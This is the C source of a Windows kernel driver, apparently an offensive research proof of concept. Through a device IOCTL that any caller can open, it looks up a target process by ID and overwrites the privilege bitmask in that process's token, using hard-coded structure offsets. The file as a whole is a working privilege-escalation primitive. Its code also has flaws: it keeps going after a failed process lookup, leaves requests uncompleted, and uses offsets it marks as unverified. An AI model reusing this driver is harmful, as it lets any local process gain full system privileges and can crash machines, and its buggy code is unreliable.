#include <ntddk.h>

#define TOKENDRIVER_TYPE 0x8001
#define IOCTL_SET_TOKEN CTL_CODE(TOKENDRIVER_TYPE, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define DWORD int

typedef struct TokenInfo
{
	ULONG ProcessID;
	ULONG_PTR TokenPrivs;
} TokenInfo, *PTokenInfo;


VOID UnloadRoutine(PDRIVER_OBJECT DriverObject)
{
	UNICODE_STRING DeviceSymLink = RTL_CONSTANT_STRING(L"\\??\\TokenDriverSymlink");

	IoDeleteDevice(DriverObject->DeviceObject);
	NTSTATUS status = IoDeleteSymbolicLink(&DeviceSymLink);
	if(!NT_SUCCESS(status))
	{
		KdPrint(("TokenDriver::UnloadRoutine - Error in IoDeleteSymbolicLink(): 0x%x\n", status));
	}
	KdPrint(("TokenDriver::UnloadRoutine - Driver unloaded successfully!\n"));
}

NTSTATUS CompleteRequest(NTSTATUS status, ULONG_PTR Info, PIRP Irp)
{
	Irp->IoStatus.Information = Info;
	Irp->IoStatus.Status = status;
	IofCompleteRequest(Irp, IO_NO_INCREMENT);
	return status;
}

NTSTATUS CreateClose(PDEVICE_OBJECT, PIRP Irp)
{
	KdPrint(("[+] TokenDriver::CreateClose - executed successfully!\n"));
	return CompleteRequest(STATUS_SUCCESS, 0, Irp);
}

NTSTATUS IoControlDispatchRoutine(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
	UNREFERENCED_PARAMETER(DeviceObject);

	NTSTATUS status = STATUS_SUCCESS;
	PIO_STACK_LOCATION IoStackLocation = IoGetCurrentIrpStackLocation(Irp);

	switch(IoStackLocation->Parameters.DeviceIoControl.IoControlCode)
	{
		case IOCTL_SET_TOKEN: 
		{
			if(IoStackLocation->MajorFunction == IRP_MJ_INTERNAL_DEVICE_CONTROL) 
			{
				KdPrint(("TokenDriver::IOCTL_SET_TOKEN - in IRP_MJ_INTERNAL_DEVICE_CONTROL\n"));
			}
			
			PTokenInfo SystemBuffer = (PTokenInfo)Irp->AssociatedIrp.SystemBuffer;
		
			DWORD InputBufferLength = IoStackLocation->Parameters.DeviceIoControl.InputBufferLength;
			//DWORD OutputBufferLength = IoStackLocation->Parameters.DeviceIoControl.OutputBufferLength;

			if(InputBufferLength  == sizeof(TokenInfo))
			{
				KdPrint(("PID: %d\n", SystemBuffer->ProcessID));

				UNICODE_STRING NPsLookupProcessByProcessId = RTL_CONSTANT_STRING(L"PsLookupProcessByProcessId");
				typedef NTSTATUS(NTAPI* fPsLookupProcessByProcessId)(HANDLE ProcessId, PEPROCESS* Process);
				fPsLookupProcessByProcessId PsLookupProcessByProcessId = (fPsLookupProcessByProcessId)MmGetSystemRoutineAddress(&NPsLookupProcessByProcessId);
				
				PEPROCESS TargetProcess;
				status = PsLookupProcessByProcessId(UlongToHandle(SystemBuffer->ProcessID), &TargetProcess);
				if(!NT_SUCCESS(status))
				{
					KdPrint(("[-] TokenDriver::IOCTL_SET_TOKEN - PsLookupProcessByProcessId() failed with 0x%x\n", status));
					CompleteRequest(status, 0, Irp);
				}

				KdPrint(("[+] TokenDriver::IOCTL_SET_TOKEN - returned _EPROCESS (%d): 0x%p\n", SystemBuffer->ProcessID, TargetProcess));

				ULONG_PTR PToken = *(ULONG_PTR*)((CHAR*)TargetProcess + 0x248); // 0x248 is the offset on my win 11 build
				PToken &= 0xFFFFFFFFFFFFFFF0; // zero out the reference count
				
				KdPrint(("[+] TokenDriver::IOCTL_SET_TOKEN _TOKEN address -  0x%p\n", PToken));


				ULONG_PTR TokenPrivileges_Present = *(ULONG_PTR*)((CHAR*)PToken + 0x40); // Need to verify it
				ULONG_PTR TokenPrivileges_Enabled = *(ULONG_PTR*)((CHAR*)PToken + 0x48); // Need to verify it

				KdPrint(("[+] TokenDriver::IOCTL_SET_TOKEN - _SEP_TOKEN_PRIVILEGES.Present: 0x%p\n", TokenPrivileges_Present));
				KdPrint(("[+] TokenDriver::IOCTL_SET_TOKEN - _SEP_TOKEN_PRIVILEGES.Enabled: 0x%p\n", TokenPrivileges_Enabled));
				
				*(ULONG_PTR*)((CHAR*)PToken + 0x40) = SystemBuffer->TokenPrivs;			// _Token._SEP_TOKEN_PRIVILEGES.Present = SystemBuffer->TokenPrivs;
				*(ULONG_PTR*)((CHAR*)PToken + 0x48) = SystemBuffer->TokenPrivs;			// _Token._SEP_TOKEN_PRIVILEGES.Enabled = SystemBuffer->TokenPrivs;


				KdPrint(("[+] TokenDriver::IOCTL_SET_TOKEN - Modified _TOKEN._SEP_TOKEN_PRIVILEGES.Present: 0x%p\n", *(ULONG_PTR*)((CHAR*)PToken + 0x40)));
				KdPrint(("[+] TokenDriver::IOCTL_SET_TOKEN - Modified _TOKEN._SEP_TOKEN_PRIVILEGES.Enabled: 0x%p\n", *(ULONG_PTR*)((CHAR*)PToken + 0x48)));

			}

			break;
		}
	}

	return status;
}


extern "C" NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) 
{
	UNREFERENCED_PARAMETER(RegistryPath);
	NTSTATUS status = STATUS_SUCCESS;

	UNICODE_STRING DeviceName = RTL_CONSTANT_STRING(L"\\Device\\TokenDriver");
	UNICODE_STRING DeviceSymLink = RTL_CONSTANT_STRING(L"\\??\\TokenDriverSymlink");
	PDEVICE_OBJECT DeviceObject;

	status = IoCreateDevice(DriverObject, 0, &DeviceName, FILE_DEVICE_UNKNOWN, 0, FALSE, &DeviceObject);

	if(!NT_SUCCESS(status))
	{
		KdPrint(("[-] TokenDriver::DriverEntry - IoCreateDevice() failed 0x%x\n", status));
		return status;
	}
	KdPrint(("[+] TokenDriver::DriverEntry - %wZ device created successfully!\n", &DeviceName));

	status = IoCreateSymbolicLink(&DeviceSymLink, &DeviceName);
	if(!NT_SUCCESS(status))
	{
		KdPrint(("[-] Token::DriverEntry - IoCreateSymbolicLink() failed 0x%x\n", status));
		IoDeleteDevice(DeviceObject);
		return status;
	}
	KdPrint(("[+] TokenDriver::DriverEntry - %wZ Symlink created successfully!\n", &DeviceSymLink));

	DriverObject->MajorFunction[IRP_MJ_CREATE] = CreateClose;
	DriverObject->MajorFunction[IRP_MJ_CLOSE] = CreateClose;
	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = IoControlDispatchRoutine;
	DriverObject->MajorFunction[IRP_MJ_INTERNAL_DEVICE_CONTROL] = IoControlDispatchRoutine; // Need to verify the internal IRP_MJ_INTERNAL_DEVICE_CONTROL functionality

	DriverObject->DriverUnload = UnloadRoutine;

	return status;
}